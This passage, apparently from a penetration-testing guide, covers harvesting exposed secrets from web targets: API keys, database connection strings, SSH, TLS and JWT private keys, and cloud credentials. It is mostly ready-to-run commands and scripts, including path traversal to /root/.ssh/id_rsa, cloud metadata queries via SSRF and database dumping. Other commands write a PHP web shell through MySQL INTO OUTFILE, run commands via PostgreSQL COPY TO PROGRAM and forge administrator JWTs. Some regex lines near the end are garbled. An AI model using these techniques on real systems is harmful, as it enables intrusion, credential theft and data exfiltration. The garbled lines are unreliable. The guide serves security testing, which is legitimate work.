- Config objects with credentials
- Commented-out test accounts

### Source Map Exploitation

**Detection**

```bash
# Check for source map references
curl https://target.com/app.js | grep "sourceMappingURL"

# Common source map locations
curl https://target.com/app.js.map
curl https://target.com/static/js/main.js.map
```

**Extraction and Analysis**

```bash
# Download source map
wget https://target.com/app.js.map

# Parse source map (contains original source)
cat app.js.map | jq '.sources'
cat app.js.map | jq '.sourcesContent'

# Source maps may contain original unminified code with comments
cat app.js.map | jq -r '.sourcesContent[]' | grep -i "password\|key\|secret"
```

### Server-Side Code Comments

[Inference] If source code is exposed through backup files or misconfigurations, server-side comments may contain credentials.

**PHP Comments**

```php
// Common patterns in PHP source
// Database credentials
// $dbpass = "OldPassword123"; // Changed to new one

/* Commented admin account
   username: admin
   password: temp_pass_2023
*/
```

**Python Comments**

```python
# API_KEY = "old_key_12345"  # Deprecated
# DATABASE_URL = "postgresql://user:pass@localhost/db"
```

**Search Patterns**

```bash
# After obtaining source code
grep -rn "password.*=.*#" .
grep -rn "password.*=.*//" .
grep -rn "TODO.*password" .
grep -rn "FIXME.*credential" .
```

## API Key Exposure

### Client-Side API Keys

**JavaScript Analysis**

```bash
# Search for common API key patterns
grep -rE "['\"]?api[_-]?key['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_-]{20,}['\"]" *.js

# Service-specific patterns
# AWS
grep -rE "AKIA[0-9A-Z]{16}" .

# Google API
grep -rE "AIza[0-9A-Za-z_-]{35}" .

# Slack
grep -rE "xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24,32}" .

# GitHub
grep -rE "gh[pousr]_[0-9a-zA-Z]{36}" .

# Stripe
grep -rE "sk_live_[0-9a-zA-Z]{24,}" .
```

**Browser DevTools**

```bash
# In browser console, search for keys
# Open DevTools (F12) > Application > Local Storage/Session Storage
# Look for stored API keys

# Network tab
# Monitor API requests for exposed keys in URLs or headers
```

**Mobile App Analysis**

```bash
# Decompile Android APK
apktool d app.apk

# Search for API keys
grep -r "api_key\|apiKey" app/
grep -rE "[0-9a-zA-Z]{32,}" app/res/values/strings.xml

# iOS app strings
strings app.ipa | grep -i "api\|key\|token"
```

### Configuration File Keys

**Environment Files**

```bash
# Common .env exposure
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production

# Parse .env content
curl -s https://target.com/.env | grep -E "API_KEY|SECRET|TOKEN"
```

**Cloud Config Files**

```bash
# AWS credentials
curl https://target.com/.aws/credentials
curl https://target.com/.aws/config

# Google Cloud
curl https://target.com/service-account.json
curl https://target.com/gcloud-credentials.json

# Azure
curl https://target.com/.azure/credentials
```

### API Endpoint Enumeration

**Discovering API Keys in Responses**

```bash
# Test API endpoints
curl https://api.target.com/v1/config
curl https://api.target.com/v1/settings

# Look for keys in error messages
curl "https://api.target.com/endpoint?api_key=invalid"
# Error may reveal: "Invalid API key. Expected format: ..."

# Check OPTIONS/TRACE methods
curl -X OPTIONS https://api.target.com/
```

**Wayback Machine for Historical Keys**

```bash
# Search archived versions for exposed keys
waybackurls target.com | grep -i "api\|key\|token" > urls.txt

# Download archived JS files
cat urls.txt | grep ".js" | while read url; do
    curl -s "$url" | grep -iE "api[_-]?key"
done
```

### GitHub/GitLab Reconnaissance

**Public Repository Search**

```bash
# GitHub search (via web or API)
# Search: "target.com" API_KEY
# Search: "target.com" filename:.env

# Use tools like trufflehog
trufflehog github --org=target-organization

# GitLab-specific
# Check for exposed CI/CD variables in public projects
```

**Commit History Mining**

```bash
# Clone public repos associated with target
git clone https://github.com/target/repo.git
cd repo/

# Search all commits
git log -p | grep -i "api_key\|password"

# Check removed files
git log --all --full-history -- "*/.env"
git show <commit_hash>:.env
```

### Automated Secret Scanning

**TruffleHog**

```bash
# Scan git repository
trufflehog git https://github.com/target/repo.git --only-verified

# Scan filesystem
trufflehog filesystem /path/to/source --only-verified

# Scan from stdin
cat urls.txt | trufflehog http
```

**Gitleaks**

```bash
# Scan repository
gitleaks detect --source . --verbose

# Scan specific commit
gitleaks detect --source . --log-opts="--since=2023-01-01"
```

**SecretScanner**

```bash
# Deepfence SecretScanner
docker run -it --rm -v /path/to/scan:/home/deepfence/scan \
    deepfenceio/secretscanner:latest -image-name /home/deepfence/scan
```

### API Key Validation

**Testing Discovered Keys**

```bash
# Generic API test
curl -H "Authorization: Bearer <API_KEY>" https://api.target.com/

# AWS key validation
aws sts get-caller-identity --profile test
# Or
aws s3 ls --profile test

# Google API key test
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<TOKEN>"

# Stripe key validation
curl https://api.stripe.com/v1/charges -u <API_KEY>:
```

### Key Patterns Reference

**AWS Access Keys**

- Format: `AKIA[0-9A-Z]{16}`
- Secret: `[0-9a-zA-Z/+=]{40}`

**Google API Keys**

- Format: `AIza[0-9A-Za-z_-]{35}`

**Slack Tokens**

- Bot: `xoxb-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24,32}`
- User: `xoxp-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24,32}`

**GitHub Tokens**

- PAT: `ghp_[0-9a-zA-Z]{36}`
- OAuth: `gho_[0-9a-zA-Z]{36}`

**JWT Tokens**

- Format: `eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+`

**Stripe Keys**

- Publishable: `pk_live_[0-9a-zA-Z]{24,}`
- Secret: `sk_live_[0-9a-zA-Z]{24,}`

### Mitigation Verification

When API keys are found, assess exposure impact:

1. Test key validity and permissions
2. Identify accessible resources/data
3. Check for privilege escalation possibilities
4. Document scope of compromise for reporting

**Important Related Topics:**

- **Source Code Analysis** - Deeper analysis of exposed source for logic flaws
- **API Security Testing** - Exploiting discovered API keys for unauthorized access
- **Authentication Bypass** - Using disclosed credentials to circumvent authentication
- **Directory Traversal** - Leveraging disclosed paths for file access attacks

---

## Database Connection Strings

Database connection strings contain credentials, hostnames, and configuration details that enable direct database access, bypassing application-layer security.

### Connection String Formats

**MySQL/MariaDB**

```
mysql://username:password@hostname:3306/database
mysql://root:P@ssw0rd123@192.168.1.100:3306/webapp_db
mysqli://dbuser:secret!pass@localhost/production_db
```

**PostgreSQL**

```
postgresql://user:password@host:5432/dbname
postgres://admin:Admin123@db.example.com:5432/maindb?sslmode=disable
pgsql://dbuser:pass@10.0.0.5/app_database
```

**MongoDB**

```
mongodb://username:password@host:27017/database
mongodb://admin:mongo_pass@mongodb.target.com:27017/admin?authSource=admin
mongodb+srv://user:pass@cluster.mongodb.net/dbname
```

**Microsoft SQL Server**

```
Server=hostname;Database=dbname;User Id=username;Password=password;
Data Source=192.168.1.50;Initial Catalog=WebApp;User ID=sa;Password=SqlPass123
mssql://sa:Password123@mssql.server.com:1433/database
```

**Oracle**

```
jdbc:oracle:thin:username/password@hostname:1521:SID
(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=oracle.host.com)(PORT=1521))(CONNECT_DATA=(SID=ORCL)))
```

**Redis**

```
redis://:password@hostname:6379
redis://user:pass@redis.example.com:6379/0
```

### Discovery Locations

**Configuration Files**

```bash
# Common config file locations
curl https://target.com/config.php
curl https://target.com/database.php
curl https://target.com/db_config.php
curl https://target.com/settings.php
curl https://target.com/config.inc.php

# Framework-specific configs
curl https://target.com/wp-config.php          # WordPress
curl https://target.com/configuration.php      # Joomla
curl https://target.com/config/database.yml    # Ruby on Rails
curl https://target.com/app/config/parameters.yml  # Symfony
curl https://target.com/sites/default/settings.php  # Drupal
```

**Environment Files**

```bash
# .env files
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production
curl https://target.com/.env.backup
curl https://target.com/.env.old

# Parse .env for database strings
curl -s https://target.com/.env | grep -iE "DATABASE_URL|DB_HOST|DB_USER|DB_PASS|DB_NAME"
```

**Application Properties**

```bash
# Java/Spring applications
curl https://target.com/application.properties
curl https://target.com/application.yml
curl https://target.com/application-prod.properties
curl https://target.com/WEB-INF/classes/application.properties

# Extract connection strings
curl -s https://target.com/application.properties | grep -i "datasource\|jdbc"
```

**Web Server Configs**

```bash
# Apache
curl https://target.com/.htaccess | grep -i "setenv.*db"

# IIS web.config
curl https://target.com/web.config

# Parse web.config for connection strings
curl -s https://target.com/web.config | grep -A5 "connectionStrings"
```

**Backup and Archive Files**

```bash
# Common backup patterns
curl https://target.com/config.php.bak
curl https://target.com/database.php.old
curl https://target.com/backup.sql
curl https://target.com/dump.sql
curl https://target.com/db_backup.tar.gz

# Download and extract
wget https://target.com/backup.tar.gz
tar -xzf backup.tar.gz
grep -r "mysql://\|postgresql://\|mongodb://" .
```

**Source Code Exposure**

```bash
# PHP source with connection strings
curl https://target.com/includes/db.php.bak

# Example exposed PHP code:
# <?php
# $conn = mysqli_connect("localhost", "webapp_user", "P@ssw0rd!", "webapp_db");
# ?>

# Python source
curl https://target.com/database.py
curl https://target.com/settings.py

# Node.js
curl https://target.com/db.js
curl https://target.com/config.js
```

### Automated Discovery

**Nuclei Templates**

```bash
# Scan for exposed config files
nuclei -u https://target.com -t exposures/configs/

# Specific database config detection
nuclei -u https://target.com -t exposures/configs/database-config-exposure.yaml
```

**Custom Wordlist Fuzzing**

```bash
# Create database config wordlist
cat > db_configs.txt << EOF
config.php
database.php
db_config.php
config.inc.php
settings.php
connection.php
db.php
dbconnect.php
database.yml
config.yml
.env
application.properties
EOF

# Fuzz for configs
ffuf -u https://target.com/FUZZ -w db_configs.txt -mc 200,403 -fs 0

# Fuzz with common extensions
ffuf -u https://target.com/config.FUZZ -w extensions.txt -mc 200
# extensions.txt: php, php.bak, php.old, php~, inc, conf, yml, json
```

**GitHub Dorking**

```bash
# Search for connection strings in repositories
# Via GitHub web interface or API

# Search patterns:
# "target.com" mysql://
# "target.com" postgresql://
# "target.com" mongodb://
# "target.com" DB_PASSWORD
# "target.com" filename:config.php

# Automated with trufflehog
trufflehog github --org=target-org --regex
```

### Extraction and Parsing

**Regex Patterns for Connection Strings**

```bash
# MySQL/MariaDB
grep -rE "mysql://[^:]+:[^@]+@[^/]+" .
grep -rE "mysqli?_connect\(['\"]([^'\"]+)['\"],\s*['\"]([^'\"]+)['\"],\s*['\"]([^'\"]+)['\"]" .

# PostgreSQL
grep -rE "postgresql://[^:]+:[^@]+@[^/]+" .
grep -rE "postgres://[^:]+:[^@]+@[^/]+" .

# MongoDB
grep -rE "mongodb(\+srv)?://[^:]+:[^@]+@[^/]+" .

# MSSQL
grep -rE "Server=[^;]+;.*User Id=[^;]+;Password=[^;]+" .
grep -rE "Data Source=[^;]+;.*User ID=[^;]+;Password=[^;]+" .

# Generic credential pairs
grep -rE "DB_(HOST|USER|PASS|NAME)\s*=\s*['\"]?[^'\";\s]+" .
```

**Automated Extraction Script**

```bash
#!/bin/bash
# Extract database credentials from downloaded files

TARGET_DIR="$1"

echo "[+] Searching for MySQL connection strings..."
grep -rE "mysql://[^:]+:[^@]+@[^/]+" "$TARGET_DIR" | tee mysql_connections.txt

echo "[+] Searching for PostgreSQL connection strings..."
grep -rE "postgre(sql)?://[^:]+:[^@]+@[^/]+" "$TARGET_DIR" | tee postgres_connections.txt

echo "[+] Searching for MongoDB connection strings..."
grep -rE "mongodb(\+srv)?://[^:]+:[^@]+@" "$TARGET_DIR" | tee mongo_connections.txt

echo "[+] Searching for environment variables..."
grep -rE "DB_(HOST|USER|USERNAME|PASS|PASSWORD|NAME|DATABASE)\s*=\s*['\"]?[^'\";\s]+" "$TARGET_DIR" | tee db_env_vars.txt

echo "[+] Searching for PHP mysqli_connect calls..."
grep -rE "mysqli?_connect\s*\(" "$TARGET_DIR" | tee php_db_connections.txt

echo "[+] Complete. Review output files."
```

### Connection String Validation

**MySQL/MariaDB Testing**

```bash
# Extract credentials from connection string
# mysql://username:password@hostname:3306/database

# Test connection
mysql -h hostname -P 3306 -u username -p'password' database -e "SELECT 1;"

# Or with connection string directly
mysql --uri="mysql://username:password@hostname:3306/database" -e "SHOW DATABASES;"

# Full enumeration if successful
mysql -h hostname -u username -p'password' -e "SELECT schema_name FROM information_schema.schemata;"
mysql -h hostname -u username -p'password' database -e "SHOW TABLES;"
```

**PostgreSQL Testing**

```bash
# Extract from: postgresql://user:password@host:5432/dbname

# Test connection
psql "postgresql://user:password@host:5432/dbname" -c "SELECT version();"

# Enumerate databases
psql "postgresql://user:password@host:5432/dbname" -c "\l"

# Enumerate tables
psql "postgresql://user:password@host:5432/dbname" -c "\dt"

# Check privileges
psql "postgresql://user:password@host:5432/dbname" -c "SELECT * FROM pg_roles WHERE rolname=current_user;"
```

**MongoDB Testing**

```bash
# Extract from: mongodb://username:password@host:27017/database

# Test connection with mongosh (modern client)
mongosh "mongodb://username:password@host:27017/database"

# Or with connection parameters
mongosh --host host --port 27017 -u username -p password --authenticationDatabase admin

# Once connected, enumerate
show dbs
use database
show collections
db.collection.findOne()
```

**MSSQL Testing**

```bash
# For: Server=hostname;Database=dbname;User Id=username;Password=password;

# Using sqlcmd (Linux/Windows)
sqlcmd -S hostname -d dbname -U username -P password -Q "SELECT @@version"

# Using impacket's mssqlclient.py (Kali Linux)
mssqlclient.py username:password@hostname -db dbname

# Enumerate databases
mssqlclient.py username:password@hostname -db dbname -windows-auth
# Once connected:
# SELECT name FROM sys.databases;
```

**Redis Testing**

```bash
# Extract from: redis://:password@hostname:6379

# Test connection
redis-cli -h hostname -p 6379 -a password PING

# If no password
redis-cli -h hostname -p 6379 PING

# Enumerate keys
redis-cli -h hostname -p 6379 -a password KEYS "*"

# Get server info
redis-cli -h hostname -p 6379 -a password INFO
```

### Post-Connection Exploitation

**Data Extraction**

```bash
# MySQL - dump specific database
mysqldump -h hostname -u username -p'password' database > dump.sql

# MySQL - dump all databases (if privileges allow)
mysqldump -h hostname -u username -p'password' --all-databases > all_databases.sql

# PostgreSQL - dump database
pg_dump "postgresql://user:password@host:5432/dbname" > dump.sql

# MongoDB - dump database
mongodump --uri="mongodb://username:password@host:27017/database" --out=dump/

# MSSQL - export data
# Use sqlcmd or mssqlclient to run SELECT INTO OUTFILE queries
```

**Privilege Escalation Checks**

```bash
# MySQL - check privileges
mysql -h host -u user -p'pass' -e "SHOW GRANTS FOR CURRENT_USER();"
mysql -h host -u user -p'pass' -e "SELECT user,host FROM mysql.user;"

# Check for FILE privilege (read/write files)
mysql -h host -u user -p'pass' -e "SELECT user,file_priv FROM mysql.user WHERE user='username';"

# PostgreSQL - check privileges
psql "postgresql://user:pass@host/db" -c "SELECT * FROM pg_roles WHERE rolname=current_user;"

# Check for superuser
psql "postgresql://user:pass@host/db" -c "SELECT rolname, rolsuper FROM pg_roles;"
```

**File System Access (if privileged)**

```bash
# MySQL - read files (requires FILE privilege)
mysql -h host -u user -p'pass' db -e "SELECT LOAD_FILE('/etc/passwd');"

# MySQL - write files
mysql -h host -u user -p'pass' db -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"

# PostgreSQL - read files (superuser required)
psql "postgresql://user:pass@host/db" -c "CREATE TABLE temp (content text); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;"

# PostgreSQL - command execution via COPY TO PROGRAM (PostgreSQL 9.3+)
psql "postgresql://user:pass@host/db" -c "COPY (SELECT '') TO PROGRAM 'id';"
```

### Common Misconfigurations

**Default Credentials in Connection Strings**

```
# Common default combinations often found:
mysql://root:root@localhost/database
mysql://root:@localhost/database
mysql://admin:admin@localhost/database
postgresql://postgres:postgres@localhost/db
mongodb://admin:admin@localhost:27017/admin
mssql://sa:Password123@localhost/master
```

**Credentials in Version Control**

```bash
# Check git history for connection strings
git log -p | grep -iE "mysql://|postgresql://|mongodb://"
git log -p | grep -iE "DB_PASSWORD|DATABASE_URL"

# Check for .env in git history
git log --all --full-history -- "*/.env"
git show <commit>:.env
```

**Exposed in Error Messages**

```bash
# Trigger database errors to reveal connection details
curl "https://target.com/page?id=abc'"

# Example error revealing connection info:
# "Connection failed: Access denied for user 'webapp_user'@'192.168.1.50' (using password: YES)"
# Now we know: username=webapp_user, host=192.168.1.50
```

**Cloud Metadata Services**

```bash
# If SSRF exists, query cloud metadata for DB credentials

# AWS EC2 metadata (often contains RDS connection info)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/

# Azure metadata
curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Google Cloud metadata
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/attributes/
```

## Private Key Exposure

Private keys (SSH, SSL/TLS, JWT, API) enable authentication, encryption, or signing. Their exposure allows impersonation, decryption, or unauthorized access.

### SSH Private Key Exposure

**Common Locations**

```bash
# Standard SSH key paths
curl https://target.com/.ssh/id_rsa
curl https://target.com/.ssh/id_dsa
curl https://target.com/.ssh/id_ecdsa
curl https://target.com/.ssh/id_ed25519

# Backup locations
curl https://target.com/id_rsa
curl https://target.com/id_rsa.bak
curl https://target.com/key.pem
curl https://target.com/privatekey.pem

# Named keys
curl https://target.com/.ssh/github_rsa
curl https://target.com/.ssh/deploy_key
curl https://target.com/.ssh/production_key
```

**Discovery via Path Traversal**

```bash
# If LFI/path traversal exists
curl "https://target.com/download?file=....//....//....//home/user/.ssh/id_rsa"
curl "https://target.com/view.php?page=../../../../../../root/.ssh/id_rsa"

# Windows paths
curl "https://target.com/file?path=C:\Users\Administrator\.ssh\id_rsa"
```

**Directory Listing Exposure**

```bash
# Check for exposed .ssh directory
curl https://target.com/.ssh/

# Automated directory fuzzing
ffuf -u https://target.com/.ssh/FUZZ -w ssh_keynames.txt -mc 200

# ssh_keynames.txt content:
# id_rsa
# id_dsa
# id_ecdsa
# id_ed25519
# authorized_keys
# known_hosts
```

**Git Repository Exposure**

```bash
# Download .git and search for keys
git-dumper https://target.com/.git/ output/
grep -r "BEGIN.*PRIVATE KEY" output/
grep -r "BEGIN RSA PRIVATE KEY" output/

# Check for keys in git history
cd output/
git log -p | grep -A30 "BEGIN.*PRIVATE KEY"
```

**Backup and Archive Files**

```bash
# Keys in backups
curl https://target.com/backup.tar.gz
tar -xzf backup.tar.gz
find . -name "id_rsa" -o -name "*.pem" -o -name "privatekey*"

# Keys in zip files
curl https://target.com/keys.zip
unzip keys.zip
grep -r "BEGIN.*PRIVATE KEY" .
```

### SSH Key Validation and Usage

**Key Format Identification**

```bash
# RSA private key (OpenSSH format)
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----

# RSA private key (PEM format)
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----

# Encrypted private key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D8F2F1E6B0A1D8A2C3B4D5E6F7A8B9C0
...
-----END RSA PRIVATE KEY-----

# ECDSA key
-----BEGIN EC PRIVATE KEY-----
...
-----END EC PRIVATE KEY-----

# ED25519 key
-----BEGIN OPENSSH PRIVATE KEY-----
(contains ed25519 in the key material)
-----END OPENSSH PRIVATE KEY-----
```

**Key Validation**

```bash
# Save exposed key
cat > found_key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[key content]
-----END RSA PRIVATE KEY-----
EOF

# Set proper permissions (SSH requires this)
chmod 600 found_key

# Validate key format
ssh-keygen -l -f found_key

# Extract public key from private key
ssh-keygen -y -f found_key > found_key.pub
```

**Using Exposed SSH Keys**

```bash
# Attempt SSH connection (if target host known)
ssh -i found_key user@target-host

# Try common usernames
for user in root admin ubuntu ec2-user deploy git; do
    echo "[+] Trying user: $user"
    ssh -i found_key -o ConnectTimeout=5 $user@target-host
done

# If authorized_keys file also exposed, match usernames
curl https://target.com/.ssh/authorized_keys
# authorized_keys format: ssh-rsa AAAA... user@hostname
# Extract username hint from comment
```

**Cracking Encrypted Keys**

```bash
# If key is encrypted (Proc-Type: 4,ENCRYPTED)

# Convert to John the Ripper format
ssh2john found_key > found_key.hash

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt found_key.hash

# Crack with hashcat
hashcat -m 22921 found_key.hash /usr/share/wordlists/rockyou.txt

# Once cracked, use with passphrase
ssh -i found_key user@target-host
# Enter passphrase when prompted
```

### SSL/TLS Private Key Exposure

**Certificate and Key Files**

```bash
# Common certificate/key filenames
curl https://target.com/server.key
curl https://target.com/private.key
curl https://target.com/ssl.key
curl https://target.com/cert.key
curl https://target.com/domain.key

# With domain name
curl https://target.com/example.com.key
curl https://target.com/ssl/example.com.key

# PEM bundles (may contain private key)
curl https://target.com/server.pem
curl https://target.com/certificate.pem

# PKCS#12 files (contain both cert and key)
curl https://target.com/certificate.pfx
curl https://target.com/certificate.p12
```

**Apache/Nginx Configuration Exposure**

```bash
# Apache config may reveal key location
curl https://target.com/apache2.conf
curl https://target.com/httpd.conf
# Look for: SSLCertificateKeyFile /path/to/private.key

# Nginx config
curl https://target.com/nginx.conf
curl https://target.com/sites-enabled/default
# Look for: ssl_certificate_key /path/to/private.key;

# Then request the disclosed path
curl https://target.com/path/to/private.key
```

**Key Format Recognition**

```bash
# RSA private key (PEM)
-----BEGIN PRIVATE KEY-----
...
-----END PRIVATE KEY-----

# Or traditional format
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----

# ECDSA private key
-----BEGIN EC PRIVATE KEY-----
...
-----END EC PRIVATE KEY-----

# Encrypted private key
-----BEGIN ENCRYPTED PRIVATE KEY-----
...
-----END ENCRYPTED PRIVATE KEY-----
```

**Key Validation**

```bash
# Verify private key format
openssl rsa -in private.key -check

# Extract public key from private key
openssl rsa -in private.key -pubout -out public.key

# View key details
openssl rsa -in private.key -text -noout

# Check if key matches a certificate
openssl x509 -noout -modulus -in certificate.crt | openssl md5
openssl rsa -noout -modulus -in private.key | openssl md5
# Modulus hashes should match
```

**Exploitation with SSL/TLS Private Keys**

```bash
# Decrypt captured TLS traffic using exposed key
# In Wireshark: Edit > Preferences > Protocols > TLS
# Add RSA key: IP address, Port, Protocol, Key file

# Man-in-the-Middle attack potential
# If private key matches target's certificate, can intercept and decrypt traffic

# Sign malicious content
# Generate CSR with exposed key to obtain fraudulent certificates
openssl req -new -key stolen_private.key -out malicious.csr
```

### JWT Private Key Exposure

**JWT Signing Key Discovery**

```bash
# Common locations
curl https://target.com/.env | grep JWT_SECRET
curl https://target.com/config.json | grep -i jwt
curl https://target.com/.well-known/jwks.json

# Application configs
curl https://target.com/application.properties | grep jwt
curl https://target.com/config/jwt.js

# Source code exposure
curl https://target.com/auth.js.bak | grep -i "private.*key\|secret"
```

**JWKS (JSON Web Key Set) Exposure**

```bash
# Public JWKS endpoint (should only contain public keys)
curl https://target.com/.well-known/jwks.json

# Misconfigured JWKS exposing private key
# Look for "d" parameter (private exponent) in RSA keys
curl -s https://target.com/.well-known/jwks.json | jq '.keys[] | select(.d)'

# Example vulnerable JWKS:
# {
#   "kty": "RSA",
#   "kid": "key-1",
#   "n": "...",  (public modulus)
#   "e": "AQAB",  (public exponent)
#   "d": "..."  (PRIVATE EXPONENT - should not be exposed)
# }
```

**JWT Key Exploitation**

```bash
# If symmetric secret (HS256) exposed
# Create malicious JWT
python3 << 'EOF'
import jwt

secret = "exposed_jwt_secret_key"
payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
EOF

# Use forged token
curl -H "Authorization: Bearer <forged_token>" https://target.com/admin

# If asymmetric private key (RS256) exposed
# Save private key to file
cat > jwt_private.key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[exposed key content]
-----END RSA PRIVATE KEY-----
EOF

# Generate malicious JWT
python3 << 'EOF'
import jwt

with open('jwt_private.key', 'r') as f:
    private_key = f.read()

payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

token = jwt.encode(payload, private_key, algorithm="RS256")
print(token)
EOF
```

**JWT Algorithm Confusion**

```bash
# If public key is known but private key is exposed elsewhere
# Or use algorithm confusion (switch RS256 to HS256)

# Extract public key from certificate
openssl x509 -pubkey -noout -in cert.pem > public.pem

# Use public key as HS256 secret (algorithm confusion attack)
python3 << 'EOF'
import jwt

with open('public.pem', 'r') as f:
    public_key = f.read()

payload = {"sub": "admin", "role": "administrator"}

# Sign with HS256 using public key as secret
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
EOF
```

### API Key/Token Private Keys

**OAuth Client Secrets**

```bash
# Exposed OAuth configuration
curl https://target.com/oauth-config.json
curl https://target.com/.env | grep -iE "CLIENT_SECRET|OAUTH"

# Example exposed config:
# {
#   "client_id": "abc123",
#   "client_secret": "xyz789_EXPOSED_SECRET",
#   "redirect_uri": "https://target.com/callback"
# }

# Use to obtain access tokens
curl -X POST https://oauth-provider.com/token \
  -d "grant_type=client_credentials" \
  -d "client_id=abc123" \
  -d "client_secret=xyz789_EXPOSED_SECRET"
```

**AWS Private Keys**

```bash
# Exposed AWS credentials
curl https://target.com/.aws/credentials

# Format:
# [default]
# aws_access_key_id = AKIAIOSFODNN7EXAMPLE
# aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Or in .env
curl https://target.com/.env | grep AWS_

# Validate and use
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
aws sts get-caller-identity
aws s3 ls
```

**GCP Service Account Keys**

```bash
# Exposed service account JSON
curl https://target.com/service-account.json
curl https://target.com/gcp-credentials.json
curl https://target.com/firebase-adminsdk.json

# Format:
# {
#   "type": "service_account",
#   "project_id": "project-123",
#   "private_key_id": "abc123",
#   "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
#   "client_email": "service-account@project.iam.gserviceaccount.com"
# }

# Authenticate and use
gcloud auth activate-service-account --key-file=service-account.json
gcloud projects list
gcloud storage ls
```

**Azure Storage Keys**

```bash
# Exposed Azure connection strings
curl https://target.com/.env | grep AZURE

# Format:
# DefaultEndpointsProtocol=https;AccountName=mystorageaccount;AccountKey=ABC123...==;EndpointSuffix=core.windows.net

# Use with Azure CLI
az storage blob list --account-name mystorageaccount --account-key "ABC123...==" --container-name mycontainer

# Or with connection string directly
az storage blob list --connection-string "DefaultEndpointsProtocol=https;AccountName=..."
```

### Automated Private Key Discovery

**Scanning with Nuclei**

```bash
# Exposed SSH keys
nuclei -u https://target.com -t exposures/files/ssh-key-exposure.yaml

# SSL private keys
nuclei -u https://target.com -t exposures/files/ssl-private-key-exposure.yaml

# Generic secrets
nuclei -u https://target.com -t exposures/tokens/
```

**TruffleHog for Repository Scanning**

```bash
# Scan for private keys in git repos
trufflehog git https://github.com/target/repo.git --only-verified

# Scan filesystem
trufflehog filesystem /path/to/webroot/ --only-verified

# Custom regex for private keys
trufflehog filesystem /path/ --regex --rules custom_rules.json
```

**Custom Private Key Scanner**

```bash
#!/bin/bash
# Scan for exposed private keys

TARGET="$1"
WORDLIST="/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt"

echo "[+] Scanning for private key exposure on $TARGET"

# SSH keys
for key in id_rsa id_dsa id_ecdsa id_ed25519 privatekey.pem server.key; do
    echo "[*] Testing: $TARGET/.ssh/$key"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/.ssh/$key")
    if [ "$RESPONSE" == "200" ]; then
        echo "[!] FOUND: $TARGET/.ssh/$key"
        curl -s "$TARGET/.ssh/$key" > "found_$key"
    fi
done

# SSL keys
for key in server.key private.key ssl.key cert.key domain.key; do
    echo "[*] Testing: $TARGET/$key"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$key")
    if [ "$RESPONSE" == "200" ]; then
        echo "[!] FOUND: $TARGET/$key"
        curl -s "$TARGET/$key" > "found_$key"
    fi
done

# Fuzz for key files
echo "[+] Fuzzing for key files..."
ffuf -u "$TARGET/FUZZ" -w "$WORDLIST" -mc 200 -e .key,.pem,.pfx,.p12 -s | while read url; do
    CONTENT=$(curl -s "$url")
    if echo "$CONTENT" | grep -q "BEGIN.*PRIVATE KEY"; then
        echo "[!] PRIVATE KEY FOUND: $url"
    fi
done
```

## Sensitive Data in Client-Side Code

Client-side code (JavaScript, HTML, CSS) is fully accessible to users and attackers, making it an inappropriate location for sensitive data.

### JavaScript Variable Exposure

**Hardcoded Credentials**

```bash
# Download all JavaScript files
wget -r -l 1 -A.js https://target.com

# Search for common patterns
grep -r "password\|apiKey\|api_key\|secret\|token\|private" *.js

# Specific patterns
grep -rE "(password|pwd|pass)\s*[:=]\s*['\"][^'\"]{1,50}['\"]" *.js
grep -rE "(api[_-]?key)\s*[:=]\s*[['"][^'"]{20,}['"]" _.js grep -rE "(secret|token)\s_[:=]\s*['"][^'"]{20,}['"]" *.js grep -rE "Bearer [a-zA-Z0-9_-]{20,}" *.js

````

**Configuration Objects**
```javascript
// Common patterns in JavaScript source

// Exposed config object
var config = {
    apiKey: "AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY",
    apiSecret: "sk_live_51HqK8jL8kN9p...",
    databaseUrl: "mongodb://admin:pass123@cluster.mongodb.net",
    privateKey: "-----BEGIN RSA PRIVATE KEY-----\n..."
};

// Hardcoded in functions
function authenticate() {
    const adminPass = "SuperSecret123!";
    const apiToken = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxx";
}

// Environment-like variables
const API_KEY = "pk_live_51Hq...";
const SECRET_KEY = "whsec_xxx...";
````

**Extraction Techniques**

```bash
# Beautify minified JavaScript
js-beautify app.min.js > app.js

# Search beautified code
grep -i "api.*key\|password\|secret\|token" app.js

# Extract all string literals
